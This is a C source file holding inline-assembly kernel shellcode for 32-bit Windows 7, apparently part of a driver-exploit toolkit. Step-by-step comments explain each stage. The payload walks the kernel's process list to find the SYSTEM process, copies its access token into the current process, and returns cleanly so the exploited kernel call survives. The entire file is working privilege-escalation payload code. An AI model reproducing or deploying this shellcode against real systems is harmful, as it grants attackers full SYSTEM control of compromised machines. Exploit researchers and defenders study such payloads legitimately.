
#include "payloads.h"

//
// GCC naked function being a Kernel Token stealing 
// shellcode implementation, operating in the following manner:
// 		1. Get the Kernel Processor Control Region current thread
//		2. Get the _EPROCESS pointer from APC_STATE structure within _KTHREAD
//		3. Store pointer of the current process' _EPROCESS structure
// 		4. Search for process with system's pid = 4
//			4a. Traverse ActiveProcessLinks.Flink pointers until you find PID=4
//		5. Get system process' token value (_EPROCESS.Token)
//			5a. And-out the lower token's bits to zero-out the ReferenceCounter
//			5b. Then retrieve ReferenceCounter of current process' token
//			5c. Then merge SYSTEM's token value with ReferenceCounter of current process' token
//		6. Replace target process' token with that merged with system's one. 
//		7. Restore EBP, return NTSTATUS_SUCCESS and exit cleanly.
//
void token_stealing_win7();
asm (
	".globl _token_stealing_win7						\n"
	"_token_stealing_win7:								\n"
	"	nop												\n"
	"	nop												\n"
	"	nop												\n"
	"	nop												\n"
#ifdef USE_INT_3_IN_SHELLCODE
	"	int $3											\n"     // To be used while VM is under WinDBG
#endif
	"	pushal											\n"
	"	xorl %eax, %eax									\n"
	"	movl %fs:" STR(KTHREAD_OFFSET) "(%eax), %eax	\n"		// Get nt!_KPCR.PcrbData.CurrentThread
	"													\n"		// _KTHREAD located at FS:[0x124]
	"	movl " STR(EPROCESS_OFFSET) "(%eax), %eax		\n"		// Get nt!_KTHREAD.ApcState.Process
	"	movl %eax, %ecx 								\n"		// Copy current process' _EPROCESS pointer
	"	movl $" STR(SYSTEM_PID) ", %edx 				\n"		// system process id
	"													\n"
	"system_pid_lookup:									\n"		// Processes traversal loop, looking for SYSTEM _EPROCESS
	"	movl " STR(FLINK_OFFSET) "(%eax), %eax			\n"		// Get nt!_EPROCESS.ActiveProcessLinks.Flink
	"	subl $" STR(FLINK_OFFSET) ", %eax 				\n"
	"	cmpl %edx, " STR(PID_OFFSET) " (%eax) 			\n" 	// Get nt!_EPROCESS.UniqueProcessId
	"	jne system_pid_lookup 							\n"
	"													\n"
	"	movl " STR(TOKEN_OFFSET) "(%eax), %edx			\n"		// Get SYSTEM process nt!_EPROCESS.Token
	"	movl " STR(TOKEN_OFFSET) "(%ecx), %edi			\n"		// Get current process nt!_EPROCESS.Token
	"													\n"
	"	andl $0xfffffff8, %edx							\n"		// apply the mask on SYSTEM process token, to remove
	"													\n"		// the reference counter on that token
	"													\n"		// (_EX_FAST_REF.RefCnt :3)
	"													\n"															
	"	andl $3, %edi									\n"		// apply the mask on current process token, to preserve
	"													\n"		// the reference counter of that token.
	"													\n"
	"	addl %edi, %edx									\n"		// merge AccessToken of SYSTEM with ReferenceCounter of
	"													\n"		// current process' token.
	"													\n"	
	"	movl %edx, " STR(TOKEN_OFFSET) "(%ecx) 			\n"		// Replace target process nt!_EPROCESS.Token
	"													\n"		// with SYSTEM process nt!_EPROCESS.Token
	"	nop												\n"
	"	nop												\n"
	"	nop												\n"
	"	nop												\n"
	"	popal											\n"
	"													\n"
#ifdef USE_INT_3_IN_SHELLCODE
	"	int $3											\n"     // To be used while VM is under WinDBG
#endif
/*
	"check_for_41s_on_stack:							\n"		// Generic stack correction upon finding 'AAAA's on stack.
	"	cmpl $0x41414141, (%esp)						\n"
	"	jne finish										\n"
	"	addl $4, %esp									\n"
	"	jmp check_for_41s_on_stack						\n"
	"													\n"
	"finish:											\n"
*/
	"   xorl %eax, %eax									\n"		// return with NTSTATUS SUCCESS
	"	pop %ebp										\n"		// restore saved EBP
	"	ret	$8											\n"		// return cleanly
	"	int $3											\n"
	"	int $3											\n"
	"	int $3											\n"
	"	int $3											\n"
);
